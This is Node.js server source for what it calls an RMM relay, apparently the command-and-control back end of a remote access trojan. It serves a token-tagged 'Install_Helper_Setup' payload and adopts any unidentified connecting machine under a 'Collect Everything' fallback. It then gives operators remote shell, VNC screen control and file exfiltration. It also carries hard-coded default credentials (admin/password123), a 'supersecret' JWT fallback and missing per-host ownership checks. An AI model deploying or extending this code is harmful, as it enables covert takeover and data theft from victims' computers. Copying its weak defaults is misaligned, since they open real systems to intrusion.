const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { PrismaClient } = require('@prisma/client');
const jwt = require('jsonwebtoken');
const WebSocket = require('ws');
const bcrypt = require('bcryptjs');
const axios = require('axios');

const app = express();
const cors = require('cors');
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const prisma = new PrismaClient();
const wss = new WebSocket.Server({ noServer: true });

app.use(cors());
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET || 'supersecret';

let GLOBAL_SETTINGS = {
    API_KEY: process.env.API_KEY || 'YOUR_SECURE_API_KEY',
    TELEMETRY_INTERVAL: '30',
    AUTO_PURGE_DAYS: '30',
    WEBHOOK_URL: '',
    PUBLIC_URL: process.env.PUBLIC_URL || ''
};

async function initializeSettings() {
    const settings = await prisma.globalSetting.findMany();
    const settingMap = {};
    settings.forEach(s => settingMap[s.key] = s.value);

    for (const [k, v] of Object.entries(GLOBAL_SETTINGS)) {
        if (!(k in settingMap)) {
            await prisma.globalSetting.create({ data: { key: k, value: v }});
        } else {
            GLOBAL_SETTINGS[k] = settingMap[k];
        }
    }

    const adminCount = await prisma.admin.count();
    if (adminCount === 0) {
        const hash = await bcrypt.hash('password123', 10);
        await prisma.admin.create({
            data: { 
              username: 'admin', 
              passwordHash: hash,
              role: 'SUPER_ADMIN'
            }
        });
        console.log('Seeded default super admin (admin/password123)');
    }
}
initializeSettings();

async function triggerWebhook(event, payload) {
    const url = GLOBAL_SETTINGS['WEBHOOK_URL'];
    if (!url || !url.startsWith('http')) return;
    try {
        await axios.post(url, {
            content: `**[${event}]** ${payload}`
        });
    } catch(e) {
        console.error('Webhook failed:', e.message);
    }
}

function generateShortToken(length = 4) {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // Avoid O, 0, I, 1
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Auto-Purge Cron (Every Hour)
setInterval(async () => {
    const purgeDays = parseInt(GLOBAL_SETTINGS['AUTO_PURGE_DAYS']);
    if (isNaN(purgeDays) || purgeDays <= 0) return;
    
    const cutoffDate = new Date();
    cutoffDate.setDate(cutoffDate.getDate() - purgeDays);
    
    try {
        const result = await prisma.host.deleteMany({
            where: { updatedAt: { lt: cutoffDate } }
        });
        if (result.count > 0) console.log(`Auto-purged ${result.count} offline hosts.`);
    } catch (e) {
        console.error('Purge error:', e.message);
    }
}, 60 * 60 * 1000);

// Map: MachineID -> socket.io Client Socket
const connectedClients = new Map();

// Map: MachineID -> Set of active WebSocket bridges (Admin UI noVNC clients)
const activeVncSessions = new Map();

// Map: MachineID -> Set of active Shell Websocket bridges (Admin UI Terminal clients)
const activeShellSessions = new Map();

app.use(express.json());

app.use(express.json());

// API: Admin Login
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Credentials required' });
    
    const admin = await prisma.admin.findUnique({ where: { username } });
    if (!admin) return res.status(401).json({ error: 'Invalid credentials' });
    
    const valid = await bcrypt.compare(password, admin.passwordHash);
    if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
    
    if (admin.status === 'DISABLED') {
        return res.status(403).json({ error: 'Account disabled' });
    }

    const token = jwt.sign({ 
        id: admin.id, 
        username: admin.username, 
        role: admin.role 
    }, JWT_SECRET, { expiresIn: '1d' });
    
    res.json({ token, role: admin.role, username: admin.username });
});

// Middleware for JWT verification
const requireAdmin = (req, res, next) => {
    let token = req.query.token;
    if (req.headers.authorization) {
        token = req.headers.authorization.split(' ')[1];
    }
    if (!token) return res.status(401).json({ error: 'Missing token' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (e) {
        res.status(401).json({ error: 'Invalid token' });
    }
};

const requireSuperAdmin = (req, res, next) => {
    requireAdmin(req, res, () => {
        if (req.user.role !== 'SUPER_ADMIN') {
            return res.status(403).json({ error: 'Super Admin privileges required' });
        }
        next();
    });
};

// API: Get Hosts List
app.get('/api/hosts', requireAdmin, async (req, res) => {
    try {
        const where = req.user.role === 'SUPER_ADMIN' ? {} : { adminId: req.user.id };
        const hosts = await prisma.host.findMany({ 
            where,
            include: { admin: { select: { username: true } } }
        });
        
        const hostsWithStatus = hosts.map(host => ({
            ...host,
            online: connectedClients.has(host.machineId),
            owner: host.admin ? host.admin.username : 'Orphaned'
        }));
        res.json(hostsWithStatus);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// API: Generate VNC Ticket
app.post('/api/hosts/:machineId/ticket', requireAdmin, (req, res) => {
    const { machineId } = req.params;
    const ticket = jwt.sign({ vnc: true, machineId }, JWT_SECRET, { expiresIn: '1m' });
    res.json({ ticket });
});

// API: Generate Shell Ticket
app.post('/api/hosts/:machineId/shell-ticket', requireAdmin, (req, res) => {
    const { machineId } = req.params;
    const ticket = jwt.sign({ shell: true, machineId }, JWT_SECRET, { expiresIn: '1m' });
    res.json({ ticket });
});

// ==========================================
// REMOTE FILE SYSTEM BRIDGE
// ==========================================

// API: Browse Directory
app.get('/api/hosts/:machineId/fs/dir', requireAdmin, async (req, res) => {
    const { machineId } = req.params;
    const { path: dirPath } = req.query;
    
    const clientSocket = connectedClients.get(machineId);
    if (!clientSocket) return res.status(404).json({ error: 'Target machine is offline' });

    // Enforce 10s socket timeout to avoid hanging the dashboard if agent drops
    clientSocket.timeout(10000).emit('fs_readdir', dirPath || '', (err, response) => {
        if (err) {
            return res.status(504).json({ error: 'Client timed out while reading directory' });
        }
        if (response && response.error) {
            return res.status(400).json({ error: response.error });
        }
        res.json(response);
    });
});

// API: Download File Stream
app.get('/api/hosts/:machineId/fs/download', requireAdmin, (req, res) => {
    const { machineId } = req.params;
    const { path: filePath } = req.query;
    
    if (!filePath) return res.status(400).json({ error: 'File path required' });

    const clientSocket = connectedClients.get(machineId);
    if (!clientSocket) return res.status(404).json({ error: 'Target machine is offline' });

    const downloadId = Date.now().toString() + Math.random().toString(36).substring(7);
    
    // Windows/Unix normalized filename parsing
    const filename = filePath.split('\\').pop().split('/').pop() || 'download';
    
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/octet-stream');

    clientSocket.emit('fs_download_start', filePath, downloadId);

    const onChunk = (chunk) => {
        res.write(chunk);
    };

    const onError = (msg) => {
        console.error(`[FS Stream] Error downloading ${filePath}: ${msg}`);
        res.end();
        cleanup();
    };

    const onEnd = () => {
        res.end();
        cleanup();
    };

    const cleanup = () => {
        clientSocket.off(`fs_chunk_${downloadId}`, onChunk);
        clientSocket.off(`fs_error_${downloadId}`, onError);
        clientSocket.off(`fs_end_${downloadId}`, onEnd);
    };

    clientSocket.on(`fs_chunk_${downloadId}`, onChunk);
    clientSocket.on(`fs_error_${downloadId}`, onError);
    clientSocket.on(`fs_end_${downloadId}`, onEnd);
    
    req.on('close', () => {
        clientSocket.emit('fs_download_cancel', downloadId);
        cleanup();
    });
});

// Settings & Config APIs (Super Admin Only)
app.get('/api/settings', requireSuperAdmin, (req, res) => {
    res.json(GLOBAL_SETTINGS);
});

app.put('/api/settings', requireSuperAdmin, async (req, res) => {
    const updates = req.body;
    for (const [k, v] of Object.entries(updates)) {
        if (GLOBAL_SETTINGS.hasOwnProperty(k)) {
            GLOBAL_SETTINGS[k] = String(v);
            await prisma.globalSetting.update({ where: { key: k }, data: { value: String(v) }});
            
            // Push dynamic telemetry update to agents
            if (k === 'TELEMETRY_INTERVAL') {
                io.sockets.emit('config_update', { telemetryInterval: Number(v) * 1000 });
            }
        }
    }
    res.json({ success: true, settings: GLOBAL_SETTINGS });
});

app.get('/api/admins', requireSuperAdmin, async (req, res) => {
    const admins = await prisma.admin.findMany({ select: { id: true, username: true, role: true, status: true, deploymentKey: true, createdAt: true }});
    res.json(admins);
});

app.post('/api/admins', requireSuperAdmin, async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
    const hash = await bcrypt.hash(password, 10);
    try {
        const a = await prisma.admin.create({ data: { username, passwordHash: hash }});
        res.json({ success: true, id: a.id });
    } catch(e) {
        res.status(400).json({ error: 'Username exists' });
    }
});

app.delete('/api/admins/:id', requireSuperAdmin, async (req, res) => {
    const count = await prisma.admin.count();
    if (count <= 1) return res.status(400).json({ error: 'Cannot delete the last admin' });
    try {
       await prisma.admin.delete({ where: { id: parseInt(req.params.id) }});
       res.json({ success: true });
    } catch(e) {
       res.status(400).json({ error: 'Admin not found' });
    }
});

app.patch('/api/admins/:id', requireSuperAdmin, async (req, res) => {
    const { status, role } = req.body;
    try {
        const updateData = {};
        if (status) updateData.status = status;
        if (role) updateData.role = role;
        
        await prisma.admin.update({
            where: { id: parseInt(req.params.id) },
            data: updateData
        });
        res.json({ success: true });
    } catch (e) {
        res.status(400).json({ error: 'Failed to update admin' });
    }
});

app.get('/api/me', requireAdmin, async (req, res) => {
    const admin = await prisma.admin.findUnique({
        where: { id: req.user.id },
        select: { id: true, username: true, role: true, deploymentKey: true }
    });
    res.json(admin);
});

// --- PAYLOAD DEPLOYMENT SYSTEM ---

// 1. Generate a new short token for the logged-in admin
app.post('/api/deploy/generate', requireAdmin, async (req, res) => {
    try {
        const token = generateShortToken(4);
        const deploymentToken = await prisma.deploymentToken.create({
            data: {
                token,
                adminId: req.user.id
            }
        });
        res.json({ token });
    } catch (e) {
        // Retry once if token collision
        const token = generateShortToken(6);
        const deploymentToken = await prisma.deploymentToken.create({
            data: { token, adminId: req.user.id }
        });
        res.json({ token });
    }
});

// 2. Resolve a short token to a full deployment key (Public)
app.get('/api/deploy/resolve/:token', async (req, res) => {
    const { token } = req.params;
    const dt = await prisma.deploymentToken.findUnique({
        where: { token },
        include: { admin: true }
    });

    if (!dt || dt.admin.status === 'DISABLED') {
        return res.status(404).json({ error: 'Invalid or expired token' });
    }

    const publicUrl = GLOBAL_SETTINGS['PUBLIC_URL'];
    const relayUrl = (publicUrl && publicUrl.startsWith('http')) 
        ? publicUrl 
        : `${req.protocol}://${req.get('host')}`;

    res.json({
        deploymentKey: dt.admin.deploymentKey,
        relayUrl: relayUrl
    });
});

// 3. Download the renamed installer
app.get('/api/deploy/download/:token', async (req, res) => {
    const { token } = req.params;
    const { type } = req.query; // ?type=msi
    const fs = require('fs');
    const path = require('path');
    
    const dt = await prisma.deploymentToken.findUnique({ where: { token } });
    if (!dt) return res.status(404).send('Invalid Token');

    const ext = type === 'msi' ? '.msi' : '.exe';
    const folder = type === 'msi' ? 'msi' : 'exe';
    const masterFilename = `Install_Helper_Setup${ext}`;

    const masterPath = path.join(__dirname, '..', 'deploy', folder, masterFilename);
    if (!fs.existsSync(masterPath)) {
        return res.status(404).send(`Master installer (${masterFilename}) not found on server. Please upload it to /deploy/${folder}`);
    }

    const publicUrl = GLOBAL_SETTINGS['PUBLIC_URL'];
    let host = req.get('host').split(':')[0]; // Get domain/IP without port
    
    if (publicUrl && publicUrl.startsWith('http')) {
        try {
            const url = new URL(publicUrl);
            host = url.hostname;
        } catch (e) {
            // Fallback to request host if URL parsing fails
        }
    }

    const safeHost = host.replace(/\./g, '-');
    const downloadName = `Install_Helper_Setup_${token}_${safeHost}${ext}`;
    
    if (type === 'msi') {
        res.setHeader('Content-Type', 'application/x-msi');
    } else {
        res.setHeader('Content-Type', 'application/x-msdownload');
    }
    res.setHeader('Content-Disposition', `attachment; filename="${downloadName}"`);
    
    fs.createReadStream(masterPath).pipe(res);
});

// Socket.io Middleware (Agent Auth via Deployment Key)
// Note: This has been modified to 'Collect Everything' mode, defaulting to Super Admin if identification fails.
io.use(async (socket, next) => {
    const token = socket.handshake.auth?.token;
    
    try {
        let admin = null;
        if (token) {
            admin = await prisma.admin.findUnique({ where: { deploymentKey: token } });
        }

        if (admin && admin.status === 'ENABLED') {
            socket.adminId = admin.id;
            return next();
        }

        // Fallback: If token is missing, invalid, or disabled, default to the first active SUPER_ADMIN
        const fallbackAdmin = await prisma.admin.findFirst({
            where: { role: 'SUPER_ADMIN', status: 'ENABLED' },
            orderBy: { id: 'asc' }
        });

        if (fallbackAdmin) {
            console.log(`[Auth Fallback] Unidentified client (${token || 'No Token'}) assigned to Super Admin fallback: ${fallbackAdmin.username}`);
            socket.adminId = fallbackAdmin.id;
            return next();
        }

        next(new Error('Authentication Error: No valid Admin or Super Admin fallback found'));
    } catch (e) {
        console.error('[Auth Error] Internal failure:', e.message);
        next(new Error('Internal Server Error during auth'));
    }
});

// WebSocket Signaling & Heartbeats (Windows Client)
io.on('connection', (socket) => {
    let socketMachineId = null;

    socket.on('heartbeat', async (payload) => {
        const { machineId, hostname, publicIp, privateIp, cpu, ram, status } = payload;
        
        socketMachineId = machineId;
        connectedClients.set(machineId, socket);

        try {
            await prisma.host.upsert({
                where: { machineId },
                update: { hostname, publicIp, privateIp, cpu: String(cpu), ram: String(ram), status, updatedAt: new Date(), adminId: socket.adminId },
                create: { machineId, hostname, publicIp, privateIp, cpu: String(cpu), ram: String(ram), status, adminId: socket.adminId }
            });
        } catch (e) {
            console.error('Database update error during heartbeat:', e);
        }
    });

    socket.on('remote_log', (payload) => {
        const { level, msg } = payload;
        const targetId = socketMachineId ? `[${socketMachineId}]` : '[Unknown Client]';
        if (level === 'error') {
            console.error(`\x1b[31m${targetId}\x1b[0m ${msg}`);
        } else {
            console.log(`\x1b[36m${targetId}\x1b[0m ${msg}`);
        }
    });

    // Receive VNC data from Windows Client and broadcast to Admins watching this machine
    socket.on('vnc_data', (data) => {
        if (!socketMachineId) return;
        const sessions = activeVncSessions.get(socketMachineId);
        if (sessions) {
            sessions.forEach(ws => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(data);
                }
            });
        }
    });

    // Receive Shell stdout from Windows Client and broadcast to Admins
    socket.on('shell_data', (data) => {
        if (!socketMachineId) return;
        const sessions = activeShellSessions.get(socketMachineId);
        if (sessions) {
            sessions.forEach(ws => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(data);
                }
            });
        }
    });

    socket.on('disconnect', () => {
        if (socketMachineId) {
            connectedClients.delete(socketMachineId);
            triggerWebhook('OFFLINE', `Host **${socketMachineId}** has disconnected.`);
            // Close any active VNC sessions for this client
            const sessions = activeVncSessions.get(socketMachineId);
            if (sessions) {
                sessions.forEach(ws => ws.close(1000, 'Client Offline'));
                activeVncSessions.delete(socketMachineId);
            }
        }
    });

    // We can't trigger webhook on standard io.on('connection') until we get the heartbeat
    // since we need their hostname.
    let connectedTriggered = false;
    socket.on('heartbeat', (payload) => {
       if (!connectedTriggered) {
          triggerWebhook('ONLINE', `Host **${payload.hostname}** (${payload.machineId}) is now online.`);
          connectedTriggered = true;
          // Synchronize telemetry rate immediately upon connection
          if (GLOBAL_SETTINGS['TELEMETRY_INTERVAL'] !== '30') {
             socket.emit('config_update', { telemetryInterval: Number(GLOBAL_SETTINGS['TELEMETRY_INTERVAL']) * 1000 });
          }
       }
    });
});

// Handle raw WebSockets for noVNC and xterm.js (Admin UI)
const shellWss = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    const url = new URL(request.url, `http://${request.headers.host}`);
    
    if (url.pathname === '/vnc') {
        const ticket = url.searchParams.get('ticket');
        try {
            const decoded = jwt.verify(ticket, JWT_SECRET);
            if (!decoded.vnc || !decoded.machineId) throw new Error('Invalid ticket payload');
            
            wss.handleUpgrade(request, socket, head, (ws) => {
                wss.emit('connection', ws, request, decoded.machineId);
            });
        } catch (e) {
            socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
            socket.destroy();
            return;
        }
    } else if (url.pathname === '/shell') {
        const ticket = url.searchParams.get('ticket');
        try {
            const decoded = jwt.verify(ticket, JWT_SECRET);
            if (!decoded.shell || !decoded.machineId) throw new Error('Invalid ticket payload');
            
            shellWss.handleUpgrade(request, socket, head, (ws) => {
                shellWss.emit('connection', ws, request, decoded.machineId);
            });
        } catch(e) {
            socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
            socket.destroy();
            return;
        }
    } else {
        // Let socket.io handle other paths
    }
});

wss.on('connection', (ws, request, machineId) => {
    console.log(`[Relay Server] Admin Dashboard mapping VNC session to machine: ${machineId}`);
    const clientSocket = connectedClients.get(machineId);
    if (!clientSocket) {
        console.log(`[Relay Server] Rejecting VNC - Machine ${machineId} is not in connectedClients map.`);
        ws.close(1000, 'Client not connected');
        return;
    }

    if (!activeVncSessions.has(machineId)) {
        activeVncSessions.set(machineId, new Set());
    }
    activeVncSessions.get(machineId).add(ws);

    console.log(`[Relay Server] Match found. Emitting start_vnc to target ${machineId}`);
    // Ask client to spawn VNC and open local bridge
    clientSocket.emit('start_vnc');

    // Admin => Client
    ws.on('message', (message) => {
        clientSocket.emit('vnc_data', message);
    });

    ws.on('close', () => {
        const sessions = activeVncSessions.get(machineId);
        if (sessions) {
            sessions.delete(ws);
            if (sessions.size === 0) {
                // Optional: ask client to stop VNC if no sessions left
                clientSocket.emit('stop_vnc');
                activeVncSessions.delete(machineId);
            }
        }
    });
});

// Shell WebSocket Gateway Handler
shellWss.on('connection', (ws, request, machineId) => {
    const clientSocket = connectedClients.get(machineId);
    if (!clientSocket) {
        ws.close(1008, 'Target machine is offline');
        return;
    }
    
    if (!activeShellSessions.has(machineId)) {
        activeShellSessions.set(machineId, new Set());
    }
    const sessions = activeShellSessions.get(machineId);
    sessions.add(ws);
    
    if (sessions.size === 1) {
        clientSocket.emit('start_shell');
    }
    
    // Relay Admin keystrokes to Windows Worker stdin
    ws.on('message', (message) => {
        clientSocket.emit('shell_input', message.toString('utf8'));
    });
    
    ws.on('close', () => {
        sessions.delete(ws);
        if (sessions.size === 0) {
            clientSocket.emit('stop_shell');
            activeShellSessions.delete(machineId);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`RMM Relay Server is running on port ${PORT}`);
});
